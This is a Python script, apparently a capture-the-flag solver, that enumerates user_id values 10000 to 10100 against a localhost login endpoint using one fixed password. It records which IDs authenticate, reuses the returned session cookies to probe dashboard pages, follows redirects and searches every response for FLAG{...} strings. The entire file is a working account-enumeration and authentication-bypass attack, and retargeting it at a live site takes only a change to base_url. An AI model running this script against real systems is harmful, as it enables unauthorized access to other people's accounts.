import requests
import re

# Target configuration
base_url = "http://localhost"
auth_endpoint = "/password/test"
test_password = "test"
start_id = 10000
end_id = 10100

print(f"[*] Fuzzing user_id parameter from {start_id} to {end_id}")
print(f"[*] Endpoint: {auth_endpoint}")
print(f"[*] Password: {test_password}\n")

# Track results
successful_auths = []
flags_found = []
anomalies = []

# Fuzz user_id parameter
for user_id in range(start_id, end_id + 1):
    # Prepare authentication request
    auth_data = {
        'user_id': user_id,
        'password': test_password
    }
    
    try:
        # Attempt authentication
        auth_response = requests.post(
            f"{base_url}{auth_endpoint}",
            data=auth_data,
            allow_redirects=False,
            timeout=10
        )
        
        # Check for FLAG in auth response
        flag_match = re.findall(r'FLAG\{[^}]+\}', auth_response.text)
        if flag_match:
            print(f"\n[!!! FLAG FOUND !!!] user_id={user_id} in AUTH response")
            print(f"    Status: {auth_response.status_code}")
            print(f"    Flags: {flag_match}")
            print(f"    Full Response:\n{auth_response.text}\n")
            flags_found.append({
                'user_id': user_id,
                'location': 'auth_response',
                'flags': flag_match,
                'response': auth_response.text
            })
        
        # Check if authentication successful (200 OK or redirect)
        if auth_response.status_code == 200:
            successful_auths.append(user_id)
            print(f"\n[SUCCESS] user_id={user_id}")
            print(f"    Status: {auth_response.status_code}")
            print(f"    Length: {len(auth_response.text)}B")
            print(f"    Cookies: {dict(auth_response.cookies)}")
            
            # Print auth response
            print(f"    Auth Response:\n{auth_response.text[:500]}")
            
            # Try to access dashboard with session cookie
            if auth_response.cookies:
                session_cookies = auth_response.cookies
                
                # Try common dashboard endpoints
                dashboard_paths = ['/dashboard', '/home', '/profile', '/index', '/user']
                
                for dashboard_path in dashboard_paths:
                    try:
                        dashboard_response = requests.get(
                            f"{base_url}{dashboard_path}",
                            cookies=session_cookies,
                            timeout=10
                        )
                        
                        # Check for FLAG in dashboard
                        dashboard_flags = re.findall(r'FLAG\{[^}]+\}', dashboard_response.text)
                        if dashboard_flags:
                            print(f"\n[!!! FLAG FOUND !!!] user_id={user_id} at {dashboard_path}")
                            print(f"    Status: {dashboard_response.status_code}")
                            print(f"    Flags: {dashboard_flags}")
                            print(f"    Full Response:\n{dashboard_response.text}\n")
                            flags_found.append({
                                'user_id': user_id,
                                'location': dashboard_path,
                                'flags': dashboard_flags,
                                'response': dashboard_response.text
                            })
                        
                        # Print successful dashboard access
                        if dashboard_response.status_code == 200:
                            print(f"    [{dashboard_path}] Status: {dashboard_response.status_code} | Length: {len(dashboard_response.text)}B")
                            if len(dashboard_response.text) > 0:
                                print(f"    [{dashboard_path}] Content preview:\n{dashboard_response.text[:300]}")
                    
                    except Exception as e:
                        pass  # Skip dashboard errors
        
        elif auth_response.status_code == 302 or auth_response.status_code == 301:
            # Redirect - might indicate successful auth
            successful_auths.append(user_id)
            print(f"\n[SUCCESS - REDIRECT] user_id={user_id}")
            print(f"    Status: {auth_response.status_code}")
            print(f"    Location: {auth_response.headers.get('Location', 'N/A')}")
            print(f"    Cookies: {dict(auth_response.cookies)}")
            
            # Follow redirect
            if auth_response.cookies:
                redirect_url = auth_response.headers.get('Location', '')
                if redirect_url:
                    try:
                        redirect_response = requests.get(
                            f"{base_url}{redirect_url}" if redirect_url.startswith('/') else redirect_url,
                            cookies=auth_response.cookies,
                            timeout=10
                        )
                        
                        # Check for FLAG in redirect target
                        redirect_flags = re.findall(r'FLAG\{[^}]+\}', redirect_response.text)
                        if redirect_flags:
                            print(f"\n[!!! FLAG FOUND !!!] user_id={user_id} at redirect target {redirect_url}")
                            print(f"    Status: {redirect_response.status_code}")
                            print(f"    Flags: {redirect_flags}")
                            print(f"    Full Response:\n{redirect_response.text}\n")
                            flags_found.append({
                                'user_id': user_id,
                                'location': f"redirect:{redirect_url}",
                                'flags': redirect_flags,
                                'response': redirect_response.text
                            })
                        
                        print(f"    Redirect content ({len(redirect_response.text)}B):\n{redirect_response.text[:300]}")
                    
                    except Exception as e:
                        print(f"    Redirect follow error: {e}")
        
        elif auth_response.status_code not in [401, 403, 404]:
            # Anomaly - not standard auth failure
            anomalies.append({
                'user_id': user_id,
                'status': auth_response.status_code,
                'length': len(auth_response.text)
            })
            print(f"\n[ANOMALY] user_id={user_id}")
            print(f"    Status: {auth_response.status_code}")
            print(f"    Response:\n{auth_response.text[:300]}")
    
    except requests.exceptions.Timeout:
        print(f"\n[TIMEOUT] user_id={user_id}")
    except Exception as e:
        print(f"\n[ERROR] user_id={user_id}: {e}")

# Final summary
print("\n" + "="*80)
print("FUZZING SUMMARY")
print("="*80)
print(f"Tested range: {start_id}-{end_id} ({end_id - start_id + 1} IDs)")
print(f"Successful authentications: {len(successful_auths)}")
if successful_auths:
    print(f"Valid user_ids: {successful_auths}")

print(f"\nAnomalies detected: {len(anomalies)}")
if anomalies:
    for anomaly in anomalies:
        print(f"  user_id={anomaly['user_id']}: status={anomaly['status']}, length={anomaly['length']}B")

print(f"\n[CRITICAL] FLAGS FOUND: {len(flags_found)}")
if flags_found:
    for flag_data in flags_found:
        print(f"\n  user_id={flag_data['user_id']} at {flag_data['location']}")
        print(f"  Flags: {flag_data['flags']}")
        print(f"  Full response:")
        print(f"  {flag_data['response']}")
else:
    print("  No FLAG{} patterns detected in any responses")

print("\n" + "="*80)

